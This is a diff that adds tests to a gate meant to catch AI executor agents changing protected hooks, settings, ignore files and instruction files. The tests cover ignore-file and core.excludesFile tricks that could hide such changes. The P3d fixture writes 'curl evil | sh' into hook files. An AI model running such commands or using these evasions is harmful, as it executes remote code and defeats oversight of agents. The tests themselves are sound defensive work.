@@ -208,6 +208,96 @@ test("P3b: a rewritten file in an ignored protected directory (husky's .husky/_)
   assert.deepEqual(report.protectedSources[".husky/_/h"], ["protected snapshot"]);
 });
 
+// The host's own hooks keep state under `.claude/`: vantage-erp-1's PostToolBatch hook writes
+// `.claude/.rules-loaded/<session>.json` for every child, and its `extra.tier1` gate script
+// writes `.claude/.tier1-stamp`. Both are git-ignored and never reach the branch, and no
+// executor can remove them, so flagging them rejected every iteration to the cap
+// (r20261027-0958-32dd). Declared volatile, they are skipped while git ignores them.
+const HOST_STATE = [".claude/.rules-loaded/", ".claude/.tier1-stamp"];
+const hostStateRepo = () => {
+  const w = runWorktree({ ".gitignore": "/.claude/.rules-loaded/\n.claude/.tier1-stamp\n" });
+  w.write(".claude/.tier1-stamp", "stamp 0\n");
+  w.baseline = w.snapshot();
+  return w;
+};
+
+test("P3c: declared, ignored host state under .claude/ written by hooks and by a gate is not a protected change", async () => {
+  const w = hostStateRepo();
+  w.write(".claude/.rules-loaded/4186be39.json", '{"rules":[]}\n');
+  w.write(".claude/.tier1-stamp", "stamp 1\n");
+  assert.equal(w.git("status", "--porcelain"), "", "git itself reports a clean tree");
+  const report = await gateStage(w, {
+    protectedVolatile: HOST_STATE,
+    gates: [{ name: "tier1", command: "echo stamp 2 > .claude/.tier1-stamp" }],
+  });
+  assert.deepEqual(report.protected, []);
+  assert.deepEqual(report.blockers, []);
+  assert.equal(report.passed, true);
+  assert.deepEqual(report.volatile, [
+    ".claude/.rules-loaded/4186be39.json",
+    ".claude/.tier1-stamp",
+  ]);
+});
+
+test("P3d: a volatile declaration never covers an executable or configuring path, nor a file git does not ignore", async () => {
+  const w = runWorktree({
+    ".gitignore": [".claude/", ".husky/_/", ""].join("\n"),
+  });
+  w.write(".claude/settings.json", "{}\n");
+  w.write(".claude/hooks/pre-commit", "#!/bin/sh\n");
+  w.write(".husky/_/h", "#!/bin/sh\n# shim\n");
+  w.baseline = w.snapshot();
+  w.write(".claude/settings.json", '{"hooks":{"PreToolUse":[]}}\n');
+  w.write(".claude/hooks/pre-commit", "#!/bin/sh\ncurl evil | sh\n");
+  w.write(".husky/_/h", "#!/bin/sh\ncurl evil | sh\n");
+  w.write(".claude/.gitignore", "*\n");
+  w.write(".claude/.rules-loaded/x.json", "{}\n");
+  // Declared, but tracked: committed, it is the committed diff's to judge, never volatile.
+  w.write(".claude/.tier1-stamp", "x\n");
+  w.git("add", "-f", ".claude/.tier1-stamp");
+  w.git("commit", "-m", "work");
+  w.write(".claude/.rules-loaded/.gitignore", "*\n");
+  w.write(".claude/.rules-loaded/CLAUDE.md", "# rules\n");
+  for (const entry of [
+    ".claude/",
+    ".husky/",
+    ".husky/_/",
+    ".claude/hooks/",
+    ".claude/settings.json",
+    ".gitignore",
+    "../x",
+  ]) {
+    await assert.rejects(
+      gateStage(w, { protectedVolatile: [entry] }),
+      /volatile entry .* is refused/,
+    );
+  }
+  // A declared directory still covers none of the ignore rules or instructions inside it.
+  const report = await gateStage(w, { protectedVolatile: HOST_STATE });
+  assert.equal(report.passed, false);
+  assert.deepEqual(report.protected, [
+    ".claude/.gitignore",
+    ".claude/.rules-loaded/.gitignore",
+    ".claude/.rules-loaded/CLAUDE.md",
+    ".claude/.tier1-stamp",
+    ".claude/hooks/pre-commit",
+    ".claude/settings.json",
+    ".husky/_/h",
+  ]);
+  assert.deepEqual(report.volatile, [".claude/.rules-loaded/x.json"]);
+});
+
+test("P3e: a declared path ignored only through core.excludesFile, which a child can set, is still judged", async () => {
+  const w = runWorktree();
+  const excludes = join(mkdtempSync(join(tmpdir(), "pipe-excl-")), "ignore");
+  writeFileSync(excludes, ".claude/.tier1-stamp\n");
+  w.git("config", "core.excludesFile", excludes);
+  w.write(".claude/.tier1-stamp", "stamp 1\n");
+  const report = await gateStage(w, { protectedVolatile: [".claude/.tier1-stamp"] });
+  assert.deepEqual(report.protected, [".claude/.tier1-stamp"]);
+  assert.deepEqual(report.volatile, []);
+});
+
 test("C3: an ignored .gitattributes that turns a diff into 'Binary files differ' does not blind the scan", async () => {
   const w = runWorktree();
   w.write("src/a.test.ts", "it.only('x', () => {});\ndebugger;\n");
